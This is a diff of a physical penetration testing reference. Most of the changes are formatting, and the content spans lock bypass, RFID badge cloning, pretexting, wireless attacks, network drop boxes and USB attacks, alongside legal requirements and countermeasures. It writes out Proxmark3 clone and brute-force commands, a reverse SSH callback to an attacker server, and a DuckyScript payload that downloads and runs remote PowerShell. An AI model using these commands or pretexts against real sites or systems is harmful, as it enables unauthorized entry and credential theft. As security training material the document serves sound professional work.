@@ -1,13 +1,13 @@
 # Physical Security Reference
 
-> **Audience**: Cybersecurity professionals, physical penetration testers, red teamers, and security engineers.
-> **Purpose**: Comprehensive hands-on reference for physical security assessment and physical penetration testing.
+> Audience: Cybersecurity professionals, physical penetration testers, red teamers, and security engineers.
+> Purpose: Comprehensive hands-on reference for physical security assessment and physical penetration testing.
 
 | | |
 |---|---|
-| **Read this when** | Scoping or running an authorized physical penetration test, assessing a facility's or server room's physical controls, building a remediation checklist after a walkthrough |
-| **Start at** | [Physical Penetration Testing Overview](#_2-physical-penetration-testing-overview), [Physical Security Controls Assessment Checklist](#_11-physical-security-controls-assessment-checklist), [Lock Picking](#_3-lock-picking) |
-| **Pairs with** | [SOCIAL_ENGINEERING_REFERENCE.md](SOCIAL_ENGINEERING_REFERENCE.md), [OSINT_REFERENCE.md](OSINT_REFERENCE.md), [SDR_RF_SECURITY_REFERENCE.md](SDR_RF_SECURITY_REFERENCE.md), [SECURITY_GADGETS_REFERENCE.md](SECURITY_GADGETS_REFERENCE.md) |
+| Read this when | Scoping or running an authorized physical penetration test, assessing a facility's or server room's physical controls, building a remediation checklist after a walkthrough |
+| Start at | [Physical Penetration Testing Overview](#_2-physical-penetration-testing-overview), [Physical Security Controls Assessment Checklist](#_11-physical-security-controls-assessment-checklist), [Lock Picking](#_3-lock-picking) |
+| Pairs with | [SOCIAL_ENGINEERING_REFERENCE.md](SOCIAL_ENGINEERING_REFERENCE.md), [OSINT_REFERENCE.md](OSINT_REFERENCE.md), [SDR_RF_SECURITY_REFERENCE.md](SDR_RF_SECURITY_REFERENCE.md), [SECURITY_GADGETS_REFERENCE.md](SECURITY_GADGETS_REFERENCE.md) |
 
 ---
 
@@ -43,45 +43,45 @@ Physical access to a system bypasses nearly all technical controls. An attacker 
 - Clone access cards and defeat logical access controls
 - Observe sensitive information (shoulder surfing, screen capture)
 
-**Key principle**: A compromised physical perimeter can render all logical security investments worthless.
+Key principle: A compromised physical perimeter can render all logical security investments worthless.
 
 ### Physical Security Domains
 
 #### Perimeter Security
-- **Fencing and walls**: Chain-link (lowest), welded wire, concrete masonry walls (high security)
-- **Barriers**: Jersey barriers, bollards (shallow-mount vs deep-mount), K-rated vehicle barriers
-- **Vehicle access controls**: Crash-rated gates, tire spikes, delta barriers, rising arm barriers
-- **Setback distance**: FEMA 426/427 standards for blast resistance setback
-- **Landscaping as security**: Berms, thorny hedges, natural barriers
+- Fencing and walls: Chain-link (lowest), welded wire, concrete masonry walls (high security)
+- Barriers: Jersey barriers, bollards (shallow-mount vs deep-mount), K-rated vehicle barriers
+- Vehicle access controls: Crash-rated gates, tire spikes, delta barriers, rising arm barriers
+- Setback distance: FEMA 426/427 standards for blast resistance setback
+- Landscaping as security: Berms, thorny hedges, natural barriers
 
 #### Building Access
-- **Doors**: Solid-core wood (minimum), hollow metal doors (commercial), steel security doors
-- **Hinges**: Concealed or security hinges (prevent hinge pin removal), anti-lift pins
-- **Locks**: Deadbolts, mortise locks, electronic cipher locks, magnetic locks, electrified hardware
-- **Card readers**: Proximity, smart card, biometric, multi-factor (card + PIN)
-- **Mantraps / airlocks**: Dual-door vestibule — second door only opens after first closes, single occupancy enforced
-- **Turnstiles**: Full-height, waist-height, optical (defeated by tailgating unless monitored)
+- Doors: Solid-core wood (minimum), hollow metal doors (commercial), steel security doors
+- Hinges: Concealed or security hinges (prevent hinge pin removal), anti-lift pins
+- Locks: Deadbolts, mortise locks, electronic cipher locks, magnetic locks, electrified hardware
+- Card readers: Proximity, smart card, biometric, multi-factor (card + PIN)
+- Mantraps / airlocks: Dual-door vestibule: second door only opens after first closes, single occupancy enforced
+- Turnstiles: Full-height, waist-height, optical (defeated by tailgating unless monitored)
 
 #### Interior Security
-- **Server cages**: Welded wire cages within data centers, cage locks
-- **Server rooms**: Dedicated rooms with badge-only access, no window exposure
-- **Safes**: TL-30 (tool resistant 30 min), TRTL (tool + torch), vault rooms
-- **Cable locks**: Kensington-style locks for laptops and portable equipment
-- **Secure file rooms**: Separate cipher-locked rooms for sensitive paper documents
+- Server cages: Welded wire cages within data centers, cage locks
+- Server rooms: Dedicated rooms with badge-only access, no window exposure
+- Safes: TL-30 (tool resistant 30 min), TRTL (tool + torch), vault rooms
+- Cable locks: Kensington-style locks for laptops and portable equipment
+- Secure file rooms: Separate cipher-locked rooms for sensitive paper documents
 
 #### Surveillance
-- **CCTV**: IP cameras (H.264/H.265), analog cameras, PTZ (pan-tilt-zoom)
-- **NVR/DVR**: Network/digital video recorders — retention typically 30–90 days
-- **Motion sensors**: PIR (passive infrared), microwave, dual-tech sensors
-- **Guards**: Reception, roving patrol, static post
-- **Guard tour systems**: Electronic wand systems that verify guard patrol routes
+- CCTV: IP cameras (H.264/H.265), analog cameras, PTZ (pan-tilt-zoom)
+- NVR/DVR: Network/digital video recorders: retention typically 30-90 days
+- Motion sensors: PIR (passive infrared), microwave, dual-tech sensors
+- Guards: Reception, roving patrol, static post
+- Guard tour systems: Electronic wand systems that verify guard patrol routes
 
 #### Environmental Controls
-- **Power**: UPS (uninterruptible power supply), redundant feeds, generator backup
-- **Cooling**: CRAC units (computer room air conditioning), N+1 redundancy
-- **Fire suppression**: Clean agent (FM-200, Novec 1230) preferred over water for server rooms; VESDA (very early smoke detection apparatus)
-- **Water/flood**: Raised floor minimum 6 inches, leak detection sensors
-- **Seismic**: Anchor racks to floor/wall in earthquake zones
+- Power: UPS (uninterruptible power supply), redundant feeds, generator backup
+- Cooling: CRAC units (computer room air conditioning), N+1 redundancy
+- Fire suppression: Clean agent (FM-200, Novec 1230) preferred over water for server rooms; VESDA (very early smoke detection apparatus)
+- Water/flood: Raised floor minimum 6 inches, leak detection sensors
+- Seismic: Anchor racks to floor/wall in earthquake zones
 
 ### Physical Security Standards
 
@@ -99,43 +99,43 @@ Physical access to a system bypasses nearly all technical controls. An attacker 
 
 ## 2. Physical Penetration Testing Overview
 
-### Legal Requirements — CRITICAL
+### Legal Requirements: CRITICAL
 
 Physical penetration testing carries serious legal risk. These are not optional:
 
-1. **Written Scope and Authorization**: Signed by an authorized officer of the target organization (not just IT). Must specify:
+1. Written Scope and Authorization: Signed by an authorized officer of the target organization (not just IT). Must specify:
    - Physical locations in scope
    - Dates/times of testing window
    - Permitted techniques (lock picking, tailgating, impersonation, etc.)
    - Out-of-scope areas (e.g., active production lines, sensitive research areas)
 
-2. **Rules of Engagement (RoE)**: Defines escalation procedures, abort criteria, emergency contacts
+2. Rules of Engagement (RoE): Defines escalation procedures, abort criteria, emergency contacts
 
-3. **Get-Out-of-Jail Letter**: Carry a printed copy AND a digital copy (email on phone). Contains:
+3. Get-Out-of-Jail Letter: Carry a printed copy AND a digital copy (email on phone). Contains:
    - Your name and contact information
    - Client's name and point of contact with phone number
    - Scope summary
    - Emergency contact for client (available 24/7 during testing)
 
-4. **Local Law Awareness**: Physical pentesting can lead to charges including:
+4. Local Law Awareness: Physical pentesting can lead to charges including:
    - Breaking and entering (even if doors are unlocked)
    - Burglary (entry with intent)
    - Criminal trespass
    - Computer fraud (if you access systems)
    - Impersonation of officials (do not impersonate law enforcement)
 
-5. **Abort Criteria**: Pre-defined conditions when testing stops immediately (e.g., armed response, injury risk)
+5. Abort Criteria: Pre-defined conditions when testing stops immediately (e.g., armed response, injury risk)
 
 ### Pre-Engagement: Reconnaissance
 
 #### OSINT Gathering
-- **Google Maps/Earth**: Facility layout, entry points, loading docks, parking structure, camera locations
-- **Street View**: Perimeter inspection, lock types visible at entrance, badge reader types
-- **LinkedIn**: Employees by department, security staff names, facilities manager, badge photos
-- **Job postings**: Security technology stack revealed ("Lenel OnGuard", "Genetec Security Center")
-- **Building permits**: Publicly available architectural drawings in many jurisdictions
-- **Company website**: Office hours, visitor procedures, reception information
-- **Social media**: Interior photos, badge designs visible in employee photos
+- Google Maps/Earth: Facility layout, entry points, loading docks, parking structure, camera locations
+- Street View: Perimeter inspection, lock types visible at entrance, badge reader types
+- LinkedIn: Employees by department, security staff names, facilities manager, badge photos
+- Job postings: Security technology stack revealed ("Lenel OnGuard", "Genetec Security Center")
+- Building permits: Publicly available architectural drawings in many jurisdictions
+- Company website: Office hours, visitor procedures, reception information
+- Social media: Interior photos, badge designs visible in employee photos
 
 #### Site Reconnaissance (External Observation)
 - Photograph entry/exit points, camera positions, guard posts
@@ -147,29 +147,29 @@ Physical penetration testing carries serious legal risk. These are not optional:
 
 ### Physical Pentesting Methodology
 
-**Phase 1: Reconnaissance**
+Phase 1: Reconnaissance
 - External observation and photography
 - OSINT correlation
 - Identify target entry points and weakest access controls
 
-**Phase 2: Social Engineering Preparation**
+Phase 2: Social Engineering Preparation
 - Develop pretext(s) appropriate to the target
 - Prepare props: fake badges, uniforms, business cards, vehicles
 - Brief team on cover stories
 - Rehearse scenarios
 
-**Phase 3: Physical Bypass Attempts**
+Phase 3: Physical Bypass Attempts
 - Execute social engineering (tailgating, impersonation)
 - Attempt physical bypass of access controls (lock picking, loiding, bypass tools)
 - Deploy monitoring/implants if in scope
 - Document evidence (covert photos/video)
 
-**Phase 4: Documentation and Evidence Collection**
+Phase 4: Documentation and Evidence Collection
 - Photograph physical vulnerabilities (unlocked doors, exposed network jacks, clean desk violations)
 - Collect samples (test drive badge cloning if authorized)
 - Document all observations with timestamps
 
-**Phase 5: Reporting**
+Phase 5: Reporting
 - Executive summary with business risk context
 - Technical findings with CVSS physical scoring
 - Evidence photos/video
@@ -178,10 +178,10 @@ Physical penetration testing carries serious legal risk. These are not optional:
 
 ### Key Resources
 
-- *"The Physical Pentest Methodology"* — Toby Wynne (comprehensive field guide)
-- *Penetration Testing Execution Standard (PTES)* — Physical Security section
-- *"Unauthorised Access: Physical Penetration Testing For IT Security Teams"* — Wil Allsopp
-- *"Low Tech Hacking"* — Jack Wiles (social engineering + physical attacks)
+- *"The Physical Pentest Methodology"*: Toby Wynne (comprehensive field guide)
+- *Penetration Testing Execution Standard (PTES)*: Physical Security section
+- *"Unauthorised Access: Physical Penetration Testing For IT Security Teams"*: Wil Allsopp
+- *"Low Tech Hacking"*: Jack Wiles (social engineering + physical attacks)
 - ASIS International: Physical Security Professional (PSP) certification body of knowledge
 
 ---
@@ -197,9 +197,9 @@ Physical penetration testing carries serious legal risk. These are not optional:
 | Disc detainer | Requires specialized pick | Medium | Sparrows disc detainer pick |
 | Tubular lock (vending, bike locks) | Tubular pick, 7-pin variant | Low-Medium | Tubular lock pick (impressioning type) |
 | Lever lock (older European) | Lever pick, false gate attacks | Medium-High | Lever picks |
-| High security — Medeco | Sidebar + angled pins defeat standard picks | Very High | Bypass preferred |
-| High security — Abloy Protec2 | Disc detainer, no springs — very pick resistant | Very High | Bypass preferred |
-| High security — Mul-T-Lock | Pin-in-pin system, very pick resistant | High | Bypass preferred |
+| High security: Medeco | Sidebar + angled pins defeat standard picks | Very High | Bypass preferred |
+| High security: Abloy Protec2 | Disc detainer, no springs: very pick resistant | Very High | Bypass preferred |
+| High security: Mul-T-Lock | Pin-in-pin system, very pick resistant | High | Bypass preferred |
 | Padlock (standard Master Lock) | Shimming, raking, bumping, bypass | Low | Shims, bump key, bypass shim |
 | Combination lock (dial) | Manipulation, bypass, decoding | Medium | Bypass shim for resettable combos |
 | Electronic keypad | Code guessing, bypass, power manipulation | Varies | Bypass tools |
@@ -215,11 +215,11 @@ The gold standard for controlled, quiet lock opening:
 3. Feel for the binding pin (the one with resistance from the tension)
 4. Gently lift the binding pin until you feel/hear a slight click (pin set)
 5. Find next binding pin and repeat
-6. All pins set → plug rotates → lock opens
+6. All pins set -> plug rotates -> lock opens
 
-**Key principle**: The tension creates a slight misalignment between the plug and shell. Pins that reach the shear line "set" on the step created by this misalignment.
+Key principle: The tension creates a slight misalignment between the plug and shell. Pins that reach the shear line "set" on the step created by this misalignment.
 
-**Tension**: Too much = pins bind and won't set; Too little = pins fall back
+Tension: Too much = pins bind and won't set; Too little = pins fall back
 
 #### Raking
 Faster but less controlled; good for low-security pin tumbler locks:
@@ -230,18 +230,18 @@ Faster but less controlled; good for low-security pin tumbler locks:
 - Common rakes: City rake, snake rake, Bogota, Worm rake, Batarang
 
 #### Lock Bumping
-- **Bump key**: Cut to maximum depth at every position (999 key)
+- Bump key: Cut to maximum depth at every position (999 key)
 - Insert bump key one position back, apply rotational tension
 - Strike the key inward with a rubber mallet/hand while maintaining tension
 - Kinetic energy transmitted through key pin to driver pin momentarily separates them
 - Rotation occurs in the moment of separation
-- **Countermeasure**: Security pins (spool, serrated, mushroom pins) make bumping much harder
+- Countermeasure: Security pins (spool, serrated, mushroom pins) make bumping much harder
 
 #### Impressioning
 - Insert blank key, apply rotational pressure
 - Key marks indicate where driver pins are resting on key blank
 - File down marks carefully, repeat until key operates lock
-- **Use case**: Leave no trace — the lock is unchanged, a working key is created
+- Use case: Leave no trace: the lock is unchanged, a working key is created
 
 ### Lock Bypass Techniques (Without Picking)
 
@@ -250,14 +250,14 @@ These techniques open doors without picking the lock mechanism:
 #### Under-Door Tool (UDT)
 - Slide a thin probe under door gap, angle upward, hook lever/door handle
 - Works on lever handles (common in offices), emergency bars
-- Requires gap of ~0.5–1 inch under door
-- **Countermeasure**: Door sweep/seal, door bottom strip, anti-UDT door guards
+- Requires gap of ~0.5-1 inch under door
+- Countermeasure: Door sweep/seal, door bottom strip, anti-UDT door guards
 
 #### Loiding (Credit Card / Shim Method)
 - Insert flexible plastic between door edge and frame at latch location
 - Push/slide shim toward door, push latch back into door
 - Only works on spring latches (not deadbolts) and when strike plate allows access
-- **Countermeasure**: Deadbolt (spring latch alone is insufficient), latch guard plate, strike plate with lip
+- Countermeasure: Deadbolt (spring latch alone is insufficient), latch guard plate, strike plate with lip
 
 #### Air Wedge + Long Reach Tool
 - Inflate air wedge in door gap to create space
@@ -266,29 +266,29 @@ These techniques open doors without picking the lock mechanism:
   - Depress push bar from outside
   - Activate REX (Request to Exit) sensor
 - Minimal door damage
-- **Countermeasure**: Interlock systems, door sensors that alarm on gap, door frame reinforcement
+- Countermeasure: Interlock systems, door sensors that alarm on gap, door frame reinforcement
 
 #### Crash Bar / Panic Bar Bypass (J-Tool / Thin Jim)
 - For outward-opening doors with crash bars (push-to-exit)
 - "J-tool": curved rod inserted through gap between door and frame
 - Hook around door edge to depress the crash bar from outside
-- **Countermeasure**: Crash bar covers/shrouds, door alarms on exterior manipulation
+- Countermeasure: Crash bar covers/shrouds, door alarms on exterior manipulation
 
 #### Magnet Bypass
 - Rare earth magnets (neodymium N52) manipulate internal magnetic latch components
 - Primarily affects certain gate latches and some electronic locks with magnetic reed switches
-- **Countermeasure**: Shielded locks, non-magnetic latch mechanisms
+- Countermeasure: Shielded locks, non-magnetic latch mechanisms
 
 #### Door Frame Spreading / Gap Attack
 - Use spreading tool (pry bar, spreader) to create gap between door and frame
 - Force spring latch out of strike plate
 - Works on lightweight frames or improperly installed locks
-- **Countermeasure**: Heavy-gauge steel frames, reinforced strike plates (3" screws), latch guards
+- Countermeasure: Heavy-gauge steel frames, reinforced strike plates (3" screws), latch guards
 
 #### REX Sensor Manipulation
 - Request-to-Exit sensors unlock doors for egress
 - PIR-based REX sensors can be triggered by waving a hand/paper under door gap
-- **Countermeasure**: Time-delayed REX, camera coverage of entry to detect manipulation
+- Countermeasure: Time-delayed REX, camera coverage of entry to detect manipulation
 
 ### Security Pin Types (Anti-Pick)
 
@@ -296,12 +296,12 @@ When picking, security pins create "false sets" — the plug partially rotates a
 
 | Pin Type | Mechanism | Detection Feel |
 |---|---|---|
-| Spool pin | Hour-glass shape — driver pin catches on ledge at shear line | False set position (slight rotation), tighter feel then releases |
+| Spool pin | Hour-glass shape: driver pin catches on ledge at shear line | False set position (slight rotation), tighter feel then releases |
 | Serrated pin | Multiple false sets per pin | Multiple click positions before true set |
 | Mushroom pin | Similar to spool; asymmetric catch | False set with plug rotation |
 | T-pin | T-shaped catch | False set, harder to release |
 
-**Picking security pins**: Reduce tension during false set to allow security portion to clear, then re-apply. Patience and very light tension is key.
+Picking security pins: Reduce tension during false set to allow security portion to clear, then re-apply. Patience and very light tension is key.
 
 ### Quality Lock Picks and Tools
 
@@ -316,12 +316,12 @@ When picking, security pins create "false sets" — the plug partially rotates a
 
 ### Learning Resources
 
-- **LockPickingLawyer** (YouTube): 1400+ videos; authoritative lock reviews and picking demos
-- **BosnianBill** (YouTube): Detailed technique explanations, lock reviews
-- **r/lockpicking** (Reddit): Active community, belt ranking system, progression guide
-- **TOOOL** (The Open Organisation Of Lockpickers): Chapters worldwide, meetups
-- **DEF CON Lockpicking Village**: Annual hands-on competition and training
-- **Locksport International**: Organized competitive locksport
+- LockPickingLawyer (YouTube): 1400+ videos; authoritative lock reviews and picking demos
+- BosnianBill (YouTube): Detailed technique explanations, lock reviews
+- r/lockpicking (Reddit): Active community, belt ranking system, progression guide
+- TOOOL (The Open Organisation Of Lockpickers): Chapters worldwide, meetups
+- DEF CON Lockpicking Village: Annual hands-on competition and training
+- Locksport International: Organized competitive locksport
 
 ---
 
@@ -344,11 +344,11 @@ When picking, security pins create "false sets" — the plug partially rotates a
 | PIV / CAC (US Government) | 13.56 MHz | Very High | Not practical | PKI-based; requires private key |
 | FeliCa (Japan/transit) | 13.56 MHz | Medium-High | Varies | Used in Suica, Octopus cards |
 
-### Proxmark3 — Premier RFID Research Tool
+### Proxmark3: Premier RFID Research Tool
 
 The Proxmark3 RDV4 is the industry standard for RFID research and physical security testing.
 
-**Basic identification:**
+Basic identification:
 ```bash
 # Auto-detect card and suggest commands
 pm3> auto
@@ -360,7 +360,7 @@ pm3> hf search
 pm3> lf search
 ```
 
-**HID Prox 125 kHz attacks:**
+HID Prox 125 kHz attacks:
 ```bash
 # Read HID Prox card
 pm3> lf hid read
@@ -375,7 +375,7 @@ pm3> lf hid sim --r <raw_hex>
 pm3> lf hid brute --fc <facility_code> --cn <start> --delay 500
 ```
 
-**EM4100 / EM410x attacks:**
+EM4100 / EM410x attacks:
 ```bash
 # Read EM4100 card
 pm3> lf em 410x read
@@ -387,7 +387,7 @@ pm3> lf em 410x clone --id <card_id>
 pm3> lf em 410x sim --id <card_id>
 ```
 
-**MIFARE Classic attacks:**
+MIFARE Classic attacks:
 ```bash
 # Automated full attack (nested + hardnested + dictionary)
 pm3> hf mf autopwn
@@ -405,7 +405,7 @@ pm3> hf mf restore --gen2
 pm3> hf mf rdbl --blk 0 --key ffffffffffff -a
 ```
 
-**iCLASS attacks:**
+iCLASS attacks:
 ```bash
 # Read iCLASS card (legacy — known default keys)
 pm3> hf iclass read
@@ -417,7 +417,7 @@ pm3> hf iclass dump --ki 0
 pm3> hf iclass loclass --f hf-iclass-key-file.bin
 ```
 
-**Useful Proxmark3 utilities:**
+Useful Proxmark3 utilities:
 ```bash
 # Write to T5577 (blank LF card)
 pm3> lf t55 write --blk 0 --data <data>
@@ -436,7 +436,7 @@ pm3> session
 
 The Flipper Zero is a portable multi-tool that reads, stores, and emulates many card types.
 
-**RFID (125 kHz) capabilities:**
+RFID (125 kHz) capabilities:
 - Reads and emulates: EM4100, HID Prox, AWID, Paradox, Indala, FDX-A, FDX-B, ioProx, Gallagher
 - Not supported for write: some brands require Proxmark3
 
@@ -446,7 +446,7 @@ RFID → Saved → (select card) → Emulate → (hold Flipper near reader)
 RFID → Saved → (select card) → Write → (hold Flipper near blank T5577)
 ```
 
-**NFC (13.56 MHz) capabilities:**
+NFC (13.56 MHz) capabilities:
 - Full support: MIFARE Ultralight, MIFARE Ultralight C, NTAG 21x series
 - Read only: MIFARE Classic (can read CSN; can emulate for some systems)
 - Not supported: DESFire, iCLASS SE, Seos, PIV
@@ -456,7 +456,7 @@ NFC → Read → (hold Flipper near card) → Save
 NFC → Saved → (select card) → Emulate
 ```
 
-**Flipper Zero limitations vs. Proxmark3:**
+Flipper Zero limitations vs. Proxmark3:
 - Cannot perform MIFARE Classic cryptographic attacks (no nested attack)
 - Cannot write all card types (Proxmark3 with T5577 is more flexible)
 - No iCLASS read capability (standard firmware)
@@ -466,11 +466,11 @@ NFC → Saved → (select card) → Emulate
 
 For demonstration of risk, researchers have built long-range readers:
 
-- **Bishop Fox Tastic RFID Thief**: Reads HID Prox/EM4100 at distances up to 3 feet (concealed in backpack)
-- **Commercial UHF RFID readers** (900 MHz): Reads UHF RFID at 15–30 feet (different technology — used in warehouses)
-- **Proximity skimmer demonstrations**: Show that cards broadcast identity without contact
+- Bishop Fox Tastic RFID Thief: Reads HID Prox/EM4100 at distances up to 3 feet (concealed in backpack)
+- Commercial UHF RFID readers (900 MHz): Reads UHF RFID at 15-30 feet (different technology — used in warehouses)
+- Proximity skimmer demonstrations: Show that cards broadcast identity without contact
 
-**Physical attack scenario**: Attacker stands near target employee in elevator or break room; long-range reader in backpack silently captures card credentials.
+Physical attack scenario: Attacker stands near target employee in elevator or break room; long-range reader in backpack silently captures card credentials.
 
 ### Badge Attack Countermeasures
 
@@ -491,15 +491,15 @@ For demonstration of risk, researchers have built long-range readers:
 
 ### Tailgating / Piggybacking
 
-**Technique**: Following an authorized person through a secured door without using credentials.
+Technique: Following an authorized person through a secured door without using credentials.
 
-**Common scenarios**:
+Common scenarios:
 - "Door barge": walking closely behind someone before door closes, acting like you belong
 - Hands-full tactic: carrying boxes/coffee so the authorized person holds the door as a courtesy
 - Distracted professional: headphones in, phone to ear, looking at laptop bag
 - Wait and tailgate: observe busy entry during high-traffic time (9 AM, lunch)
 
-**Defenses**:
+Defenses:
 - Mantraps/airlocks: physical prevention (door 2 won't open until door 1 closes)
 - Full-height turnstiles: one-person-per-credential enforcement
 - Security culture: employees challenge/report tailgaters
@@ -508,30 +508,30 @@ For demonstration of risk, researchers have built long-range readers:
 
 ### Pretexting Scenarios
 
-**IT Technician / Contractor**:
+IT Technician / Contractor:
 - Pretext: "I'm from [outsourced IT provider], here to replace the UPS in the server room"
 - Props: polo shirt with IT company logo, laptop bag, tools
 - Build credibility: call ahead posing as coordinator to "confirm the appointment"
 - Target: server rooms, communications closets, data center floors
 
-**Delivery Person**:
+Delivery Person:
 - Pretext: UPS/FedEx/DHL delivery requiring signature
 - Props: uniform (purchased online), packages, handheld scanner (prop)
 - Urgency: delivery creates time pressure, people don't want to delay
 - Target: reception bypass, getting into mailroom or building interior
 
-**Fire Safety Inspector**:
+Fire Safety Inspector:
 - Pretext: "Annual fire suppression inspection" (often outsourced, employees don't know inspector)
 - Props: clipboard, fire inspection forms, hi-vis vest
 - Leverage: legal obligation creates compliance pressure
 - Target: server rooms (fire suppression systems are there), all floors
 
-**Auditor / Assessor**:
+Auditor / Assessor:
 - Pretext: "I'm with [audit firm] conducting the annual [compliance] assessment"
 - Props: professional attire, portfolio, business cards
 - Target: interviewing employees (information gathering), reviewing physical controls
 
-**New Employee**:
+New Employee:
 - Pretext: "I just started last week, I haven't gotten my badge sorted yet"
 - Relies on employees' desire to be helpful to new colleagues
 - Target: general office areas, meeting rooms
@@ -555,7 +555,7 @@ Calling ahead significantly increases physical SE success:
 2. Pose as coordinator from the vendor/audit firm
 3. "Confirm" the appointment for your physical visit
 4. Optionally: get the name of the contact person you'll meet (then use that name on arrival)
-5. Create a paper trail in the target's mind — receptionist will be expecting the visit
+5. Create a paper trail in the target's mind: receptionist will be expecting the visit
 
 ### Dumpster Diving (MITRE ATT&CK T1592.002)
 
@@ -568,9 +568,9 @@ Physical dumpster diving can yield:
 - Employee directories
 - Internal phone lists
 
-**Legal note**: Dumpster diving legality varies by jurisdiction. Once trash is placed at public collection point, it is generally not protected property in the US (California v. Greenwood), but laws vary.
+Legal note: Dumpster diving legality varies by jurisdiction. Once trash is placed at public collection point, it is generally not protected property in the US (California v. Greenwood), but laws vary.
 
-**Defenses**:
+Defenses:
 - Cross-cut paper shredder (strip-cut is insufficient; cross-cut is minimum; micro-cut is best)
 - Secure media destruction program (NIST 800-88 compliant)
 - Locked/chained dumpsters
@@ -583,7 +583,7 @@ Physical dumpster diving can yield:
 - Observe passwords being typed
 - High-value targets: badge PIN (opens physical doors), laptop login (direct system access)
 
-**Defenses**:
+Defenses:
 - Privacy screens on monitors
 - PIN pad shields at badge readers
 - Awareness training (shield PIN entry)
@@ -595,7 +595,7 @@ Physical dumpster diving can yield:
 
 ### Evil Twin / Rogue Access Point
 
-**Hak5 WiFi Pineapple**:
+Hak5 WiFi Pineapple:
 - Purpose-built device for wireless MITM and monitoring
 - Passive recon: records all probe requests (devices advertising known network names)
 - PineAP: responds to probe requests with fake APs matching remembered SSIDs
@@ -603,7 +603,7 @@ Physical dumpster diving can yield:
 - Filtering: target specific MAC addresses or SSIDs
 - Remote management via web interface or cloud dashboard
 
-**Manual rogue AP with hostapd/dnsmasq**:
+Manual rogue AP with hostapd/dnsmasq:
 ```bash
 # Create access point interface
 hostapd /etc/hostapd/hostapd.conf
@@ -620,7 +620,7 @@ responder -I wlan0 -wFbP
 
 ### Bluetooth Attacks
 
-**Flipper Zero Bluetooth capabilities**:
+Flipper Zero Bluetooth capabilities:
 ```
 Bluetooth → BLE Spam → (various attack types)
 - AAPL Action Modals: floods Apple devices with pairing requests
@@ -628,13 +628,13 @@ Bluetooth → BLE Spam → (various attack types)
 - Windows Swift Pair: Windows pairing notification flood
 ```
 
-**Classic Bluetooth attacks** (legacy devices):
-- **BlueJacking**: Send unsolicited messages to discoverable devices
-- **BlueSnarfing**: Unauthorized access to phone book, calendar via OBEX protocol (patched in modern devices)
-- **BlueBugging**: Remote command execution on vulnerable phones (legacy)
-- **Bluetooth Impersonation Attack (BIAS)**: CVE-2020-10135 — spoofs previously paired devices
+Classic Bluetooth attacks (legacy devices):
+- BlueJacking: Send unsolicited messages to discoverable devices
+- BlueSnarfing: Unauthorized access to phone book, calendar via OBEX protocol (patched in modern devices)
+- BlueBugging: Remote command execution on vulnerable phones (legacy)
+- Bluetooth Impersonation Attack (BIAS): CVE-2020-10135: spoofs previously paired devices
 
-**Practical use in physical pentesting**:
+Practical use in physical pentesting:
 - BLE scanning to identify employee devices and their proximity
 - Detecting BLE-enabled access control devices (some doors use BLE for mobile credentials)
 - Identifying IoT devices with BLE interfaces on the network perimeter
@@ -647,21 +647,21 @@ Sub-GHz → Saved → (select capture) → Send
 Sub-GHz → Read RAW → (capture raw signal)
 ```
 
-**Fixed code systems** (cloneable):
+Fixed code systems (cloneable):
 - Garage door remotes operating at 315/433/868 MHz with fixed codes
 - Simple on/off remote controls
 - Gate remotes without rolling code
 - Capture and replay is trivial
 
-**Rolling code systems (KeeLoq)**:
+Rolling code systems (KeeLoq):
 - Used in modern garage doors (LiftMaster, Chamberlain, Genie)
 - Each button press sends a different code derived from a counter
-- **RollJam attack** (Samy Kamkar): Jam signal while capturing; force second transmission; play back first captured code later
+- RollJam attack (Samy Kamkar): Jam signal while capturing; force second transmission; play back first captured code later
 - Defense: Modern implementations with synchronization limits are more resistant; some are vulnerable to timing attacks
 
-**Other Sub-GHz targets**:
-- Tire pressure monitoring systems (TPMS) — passive location tracking
-- Weather stations — spoofing
+Other Sub-GHz targets:
+- Tire pressure monitoring systems (TPMS): passive location tracking
+- Weather stations: spoofing
 - Door/window contact sensors (some ISM band alarm sensors)
 - Smart meter communications (AMI/AMR)
 - Car key fobs (some older models vulnerable to amplification/relay attacks)
@@ -673,7 +673,7 @@ Infrared → Learn New Remote → (capture)
 Infrared → Universal Remotes → TV/HVAC/Projector
 ```
 
-**Physical security relevance**:
+Physical security relevance:
 - IR-controlled projectors: disruption during sensitive presentations
 - HVAC systems with IR control: environmental disruption
 - IR-controlled door locks (rare but present in some hospitality/hotel environments)
@@ -697,13 +697,13 @@ Infrared → Universal Remotes → TV/HVAC/Projector
 
 ### Drop Box Configuration
 
-**Physical deployment**:
+Physical deployment:
 1. Find an accessible network jack: conference rooms, reception, lobbies, hallways near network closets, unoccupied offices
 2. Connect device to network jack and power (USB power brick if needed)
 3. Verify device obtains DHCP lease
 4. Device initiates outbound C2 connection (bypasses most ingress firewall rules)
 
-**Reverse SSH tunnel (persistent callback)**:
+Reverse SSH tunnel (persistent callback):
 ```bash
 # On drop box (Raspberry Pi / LAN Turtle):
 autossh -M 0 -N \
@@ -718,7 +718,7 @@ autossh -M 0 -N \
 ssh -p 2222 pi@localhost
 ```
 
-**VPN callback (alternative to SSH)**:
+VPN callback (alternative to SSH):
 ```bash
 # On drop box:
 openvpn --config /etc/openvpn/callback.conf --daemon
@@ -726,7 +726,7 @@ openvpn --config /etc/openvpn/callback.conf --daemon
 # VPN server receives connection; attacker routes through VPN to reach implant's network
 ```
 
-**Persistence mechanisms**:
+Persistence mechanisms:
 ```bash
 # systemd service on drop box
 [Unit]
@@ -742,7 +742,7 @@ RestartSec=30
 WantedBy=multi-user.target
 ```
 
-**Drop box OPSEC**:
+Drop box OPSEC:
 - Use a nondescript case (USB charger housing, inside an old printer/phone)
 - Mount inside a network closet if accessible
 - Choose ports in low-traffic areas
@@ -750,7 +750,7 @@ WantedBy=multi-user.target
 
 ### USB Attacks
 
-**Rubber Ducky (Hak5 USB Rubber Ducky)**:
+Rubber Ducky (Hak5 USB Rubber Ducky):
 - Appears as a USB HID keyboard to the OS
 - Executes DuckyScript payloads at 1000+ keystrokes/second
 - Bypasses endpoint DLP that blocks USB storage
@@ -764,19 +764,19 @@ STRING powershell -w h -ep bypass -c "IEX(New-Object Net.WebClient).DownloadStri
 ENTER
 ```
 
-**Bash Bunny**:
+Bash Bunny:
 - Supports HID + storage + network (RNDIS/CDC-ECM ethernet emulation) simultaneously
 - Can perform: credential capture (Responder), file exfiltration, reverse shell
 - Auto-switches between attack modes based on DIP switch position
 
-**O.MG Elite Cable**:
+O.MG Elite Cable:
 - Looks and functions as a normal USB-C/Lightning/Micro-USB cable
 - Contains implanted WiFi-accessible microcontroller
